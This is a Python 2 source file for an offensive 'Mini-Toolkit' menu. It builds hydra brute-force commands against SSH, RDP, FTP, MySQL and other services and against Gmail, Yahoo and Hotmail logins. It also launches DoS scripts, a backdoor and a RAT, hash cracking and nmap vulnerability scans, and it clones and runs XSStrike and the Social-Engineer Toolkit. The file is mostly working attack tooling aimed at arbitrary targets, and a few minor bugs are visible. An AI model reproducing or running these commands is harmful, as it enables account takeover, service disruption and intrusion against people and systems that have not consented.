#!/usr/bin/python
#
import os,time,sys
from time import sleep as timeout
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End
def clean():
    os.system('clear')
#modules
def info():
     print
     print "==================================="
     print ""+R+"Mini-Toolkit            "
     print ""+O+"@WongNdesoCok            "
     print ""+G+"xzhack206@gmail.com  "
     print ""+O+"==================================="
     print
     main()

def brute():
    os.system("figlet Brute Force")
    print
    print "  {1}~Cisco Brute Force         "
    print "  {2}~VNC Brute Force           "
    print "  {3}~FTP Brute Force           "
    print "  {4}~Gmail Brute Force         "
    print "  {5}~SSH Brute Force           "
    print "  {6}~TeamSpeak Brute Force     "
    print "  {7}~Telnet Brute Force        "
    print "  {8}~Yahoo Mail Brute Force    "
    print "  {9}~Hotmail Brute Force       "
    print "  {10}~Router Speedy Brute Force "
    print "  {11}~RDP Brute Force           "
    print "  {12}~MySQL Brute Force         "
    print
    print "  {0}~Back"
    print
    bhydra = raw_input("bruteforce ~#  ")
    if bhydra == '01' or bhydra == '1':
      os.system("clear")
      os.system("figlet Cisco Brute Force ")
      iphost = raw_input("[*] IP/Hostname : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -P %s %s cisco" % (word, iphost))
      brute()
    elif bhydra == '02' or bhydra == '2':
      os.system("clear")
      os.system("figlet VNC Brute Force")
      word = raw_input("[*] Wordlist : ")
      iphost = raw_input("[*] IP/Hostname : ")
      os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
      brute()

    elif bhydra == '03' or bhydra == '3':
      os.system("figlet FTP Brute Force")
      user = raw_input("[*] User : ")
      iphost = raw_input("[*] IP/Hostname : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
      brute()

    elif bhydra == '04' or bhydra == '4':
      os.system("clear")
      os.system("figlet Gmail Brute Force")
      email = raw_input("[*] Email : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
      brute()

    elif bhydra == '05' or bhydra == '5':
       os.system("clear")
       os.system("figlet SSH Brute Force")
       user = raw_input("[*] User : ")
       word = raw_input("[*] Wordlist : ")
       iphost = raw_input("[*] IP/Hostname : ")
       os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
       brute()

    elif bhydra == '06' or bhydra == '6':
       os.system("clear")
       os.system("figlet TeamSpeak Brute Force")
       user = raw_input("[*] User : ")
       word = raw_input("[*] Wordlist : ")
       iphost = raw_input("[*] IP/Hostname : ")
       os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
       brute()

    elif bhydra == '07' or bhydra == '7':
      os.system("clear")
      os.system("figlet Telnet Brute Force")
      user = raw_input("[*] User : ")
      word = raw_input("[*] Wordlist : ")
      iphost = raw_input("[*] IP/Hostname : ")
      os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
      brute()

    elif bhydra == '08' or bhydra == '8':
      os.system("clear")
      os.system("Yahoo Brute Force")
      email = raw_input("[*] Email : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
      brute()

    elif bhydra == '09' or bhydra == '9':
      os.system("clear")
      os.system("figlet Hotmail Brute Force")
      email = raw_input("[*] Email : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
      brute()

    elif bhydra == '10':
      os.system("clear")
      os.system("figlet Router Speedy Brute Force")
      user = raw_input("[*] User : ")
      word = raw_input("[*] Wordlist : ")
      iphost = raw_input("[*] IP/Hostname : ")
      os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
      brute()

    elif bhydra == '11':
      os.system("clear")
      os.system("figlet PDR Brute Force")
      user = raw_input("[*] User : ")
      word = raw_input("[*] Wordlist : ")
      iphost = raw_input("[*] IP/Hostname : ")
      os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
      brute()

    elif bhydra == '12':
      os.system("clear")
      os.system("figlet My SQL Brute Force")
      user = raw_input("[*] User : ")
      word = raw_input("[*] Wordlist : ")
      os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
      brute()
    elif bhydra =='0':
        start()
        main()
    else:
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",bhydra
        brute()

def Webhacking():
    print " __        _______ ____  _   _    _    ____ _  _____ _   _  ____ "
    print " \ \      / / ____| __ )| | | |  / \  / ___| |/ /_ _| \ | |/ ___|"
    print "  \ \ /\ / /|  _| |  _ \| |_| | / _ \| |   | ' / | ||  \| | |  _ "
    print "   \ V  V / | |___| |_) |  _  |/ ___ \ |___| . \ | || |\  | |_| | "
    print "    \_/\_/  |_____|____/|_| |_/_/   \_\____|_|\_\___|_| \_|\____| "
    print
    print "     {1}~OWScan "
    print "     {2}~DDOS "
    print "     {3}~w9scan"
    print "     {4}~dirSec"
    print
    print "     {0}~back"
    print
    web = raw_input("webhacking~# ")
    if web == "1":
        os.system("clear")
        os.system("php modules/owscan/owscan.php")
        Webhacking()
    elif web == "2":
        print "__        __   _    /\/|___   ___  ____  "
        print "\ \      / /__| |__|/\/  _ \ / _ \/ ___| "
        print " \ \ /\ / / _ \ '_ \  | | | | | | \___ \ "
        print "  \ V  V /  __/ |_) | | |_| | |_| |___) | "
        print "   \_/\_/ \___|_.__/  |____/ \___/|____/ "
        print
        print "     {1}~Akira_DOSS"
        print "     {2}~DDOS2track"
        print
        print "     {0}~Back"
        print
        web = raw_input("DOS~# ")
        if web == "1":
            os.system("clear")
            print "  ____   ___  ____"
            print " |  _ \ / _ \/ ___|"
            print " | | | | | | \___ \ "
            print " | |_| | |_| |___) | "
            print " |____/ \___/|____/ "
            print
            url = raw_input("Masukan_Target(URL): ")
            os.system("python modules/dos/dos.py %s" % (url))
            Webhacking()
        elif web == "2":
               os.system("clear")
               os.system("bash modules/dos/dos ")
               Webhacking()

        elif web == "0":
             main()
        else:
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",console
            Webhacking()
    elif web == "3":
          os.system("clear")
          os.system("python modules/w9scan/w9.py")
          Webhacking()
    elif web == "4":
          os.system("clear")
          os.system("python modules/dir/dir.py")
          Webhacking()
    elif web == "0":
        start()
        main()
    else:
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",web
        Webhacking()

def Passwords():
    print"""   _       _     _     _          _       _      _     _
_ __ ( ) __ _( )___( )___( )_      _( ) ___ ( )_ __( ) __| |
| '_ \|/ / _` |// __|// __|/\ \ /\ / // / _ \|/| '__|/ / _` |
| |_) | | (_| | \__ \ \__ \  \ V  V /  | (_) | | |    | (_| |
| .__/   \__,_| |___/ |___/   \_/\_/    \___/  |_|     \__,_|
|_|           """
    print "     {1}~cupp"
    print "     {2}~hediye (Hash Generator & Cracker Online Offline)"
    print
    print "     {0}~back"
    print
    pas = raw_input("password~# ")
    if pas == "1" or pas == "01":
        os.system("python modules/cup/cupp.py")
        Passwords()
    elif pas == "2" or pas == "02":
        os.system("clear")
        print """   _       _     _     _          _       _      _     _
    _ __ ( ) __ _( )___( )___( )_      _( ) ___ ( )_ __( ) __| |
   | '_ \|/ / _` |// __|// __|/\ \ /\ / // / _ \|/| '__|/ / _` |
   | |_) | | (_| | \__ \ \__ \  \ V  V /  | (_) | | |    | (_| |
   | .__/   \__,_| |___/ |___/   \_/\_/    \___/  |_|     \__,_|
   |_|           """
        print
        print "     {1}~Hash Key"
        print "     {2}~Hash Brute"
        print "     {3}~Auto Hash"
        print
        print "     {0}~Back"
        pas = raw_input("password~# ")
        if pas == "1":
            os.system("clear")
            os.system("figlet Hash-key")
            key = raw_input("input Key:")
            os.system("python3 modules/hash/hash.py -k %s" % (key))
            Passwords()
        elif pas == "2":
            os.system("clear")
            os.system("figlet Hash-Brute")
            hash = raw_input("Hash:")
            wordlists = raw_input("wordlists: ")
            os.system("python3 modules/hash/hash.py -v %s -f %s " % (hash, wordlists))
            Passwords()
        elif pas == "3":
            os.system("clear")
            os.system("figlet auto-hash")
            hash = raw_input("~Hash: ")
            os.system("python3 modules/hash/hash.py -n %s " % (hash))
            Passwords()
        elif pas == "0":
             os.system("clear")
             timeout(1)
             start()
             main()
        else:
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",pas
            Passwords()
    elif pas == "0":
        start()
        main()
    else:
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",pas
        Passwords()

def Backdoor():
    print """ _                _       _
| |__   __ _  ___| | ____| | ___   ___  _ __
| '_ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
| |_) | (_| | (__|   < (_| | (_) | (_) | |
|_.__/ \__,_|\___|_|\_\__,_|\___/ \___/|_|
"""
    print"   {1}~brutal "
    print"   {2}~RAT(Remote Administrator Tool) "
    print
    print "  {0}~Back"
    print
    bac = raw_input("backdoor~# ")
    if bac == "1":
        os.system("bash modules/brutal/brutal.sh")
        Backdoor()
    elif bac == "2":
          os.system("clear")
          os.system("python modules/rat/rat.py")
          Backdoor()
    elif bac == "0":
        start()
        main()
    else:
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",bac
        Backdoor()

def scanner():
     print " ____                           "
     print "/ ___|  ___ __ _ _ __  _ __   ___ _ __ "
     print "\___ \ / __/ _` | '_ \| '_ \ / _ \ '__| "
     print " ___) | (_| (_| | | | | | | |  __/ |   "
     print "|____/ \___\__,_|_| |_|_| |_|\___|_|   "
     print
     print "    {1}~NMAP Scanner"
     print "    {2}~XXsStrike"
     print "    {3}~Whois"
     print "    {4}~Setoolkit"
     print "    {5}~Strike"
     print "    {6}~PortSpider"
     print
     print "    {0}~back"
     print
     web = raw_input("Scanner~# ")
     if web == "1" or web == "01":
         os.system("clear")
         print " 88b 88 8b    d8    db    88""Yb "
         print " 88Yb88 88b  d88   dPYb   88__dP "
         print " 88 Y88 88YbdP88  dP__Yb  88 "
         print " 88  Y8 88 YY 88 dP----Yb 88 "
         print
         print "   {1}--Simple Scan [-sV]"
         print "   {2}--Port Scan [-Pn]"
         print "   {3}--Operating System Detection [-A]"
         print "   {4}--Scanner Vulnerability "
         print
         print "   {0}--Back"
         print
         web = raw_input("nmap ~# ")
         if web == "1" or web == "01":
             target = raw_input("nmap~target# ")
             os.system("nmap -sV -oN %s " % (target))
             scanner()
         elif web == "2" or web == "02":
              target = raw_input("nmap~target# ")
              os.system("nmap -Pn -oN %s " % (target))
              scanner()
         elif web == "3" or web == "03":
              target = raw_input("nmap~target# ")
              os.system("nmap -A -oN %s " % (target))
              scanner()
         elif web == "4" or web == "04":
              target = raw_input("nmap~target# ")
              os.system("nmap -sV --script vuln %s " % (target))
              scanner()
         elif web =='0':
             main()
     elif web == "2" or web == "02":
           os.system("cd modules/ && git clone https://github.com/UltimateHackers/XSStrike.git")
           os.system("pip install -r modules/XSStrike/requirements.txt")
           os.system("python modules/XSStrike/xsstrike.py")
           scanner()
     elif web == "3" or web == "03":
           os.system("clear")
           print "           _           _"
           print " __      _| |__   ___ (_)___"
           print " \ \ /\ / / '_ \ / _ \| / __|"
           print "  \ V  V /| | | | (_) | \__ \ "
           print "   \_/\_/ |_| |_|\___/|_|___/ "
           print
           host = raw_input("   Enter a Host: ")
           os.system("whois %s" % (host,))
           scanner()
     elif web == "4" or web == "04":
           os.system("clear")
           os.system("cd modules/ && git clone https://github.com/trustedsec/social-engineer-toolkit.git")
           os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
           python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
           os.system("python modules/social-enginering-toolkit/setup.py install")
           os.system("setoolkit")
           scanner()
     elif web == "5" or web == "05":
           os.system("clear")
           os.system("python modules/strike/strike.py")
           scanner()
     elif web == "6" or web == "06":
           os.system("clear")
           os.system("python3 modules/port/port.py")
           scanner()
     elif web == "0":
         timeout(1)
         start()
         main()
     else:
         print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",web
         scanner()

#MAIN
def start():
    print
    clean()
    print""+G+"""
                    /$$         /$$    /$$$$$$$$               /$$/$$      /$$  /$$
                   |__/        |__/   |__  $$__/              | $| $$     |__/ | $$
       /$$$$$$/$$$$ /$$/$$$$$$$ /$$      | $$ /$$$$$$  /$$$$$$| $| $$   /$$/$$/$$$$$$
      | $$_  $$_  $| $| $$__  $| $$/$$$$$| $$/$$__  $$/$$__  $| $| $$  /$$| $|_  $$_/
      | $$ \ $$ \ $| $| $$  \ $| $|______| $| $$  \ $| $$  \ $| $| $$$$$$/| $$ | $$
      | $$ | $$ | $| $| $$  | $| $$      | $| $$  | $| $$  | $| $| $$_  $$| $$ | $$ /$$
      | $$ | $$ | $| $| $$  | $| $$      | $|  $$$$$$|  $$$$$$| $| $$ \  $| $$ |  $$$$/
      |__/ |__/ |__|__|__/  |__|__/      |__/\______/ \______/|__|__/  \__|__/  \___/
                    """+R+"""                                    V.1.0.1
                    """+O+"""    +--[code: Ari @WongNdesoCok]--+
                                                                                       """""""""
    print
    print""+B+"       {1}~Scanner             "
    print"       {2}~BroteForce              "
    print"       {3}~Webhacking "
    print"       {4}~Passwords"
    print"       {5}~Backdoor "
    print
    print"       {99}~Informasion"
    print"       {0}~Exit "

def main():
    while True:
          try:
              print
              console = raw_input("console ~# ")
              if console == "99":
                 info()
              elif console == "1" or console == "01":
                 scanner()
              elif console == "2" or console == "02":
                  brute()
              elif console == "3" or console == "03":
                    Webhacking()
              elif console == "4" or console == "04":
                   Passwords()
              elif console == "5" or console == "05":
                    Backdoor()
              elif console == "0" or console == "00":
                  sys.exit()
              else:
                  print ""+N+""+B+"["+R+"!"+B+"] "+N+"Wrong Command => ",console
                  main()
          except(KeyboardInterrupt):
              print("\n[*] (Ctrl + C ) Detected, Trying To Exit ..." )
              print("[*] Thank You For Using Mini-Toolkit =)" )
              exit()

if __name__ == "__main__":
  try:
      try:
         start()
         main()
      except EOFError:
          print("\nCtrl + D")
          print("\nExiting...")
          sys.exit()
  except KeyboardInterrupt:
      print("\nCtrl + C")
      print("\nExiting...")
      sys.exit()
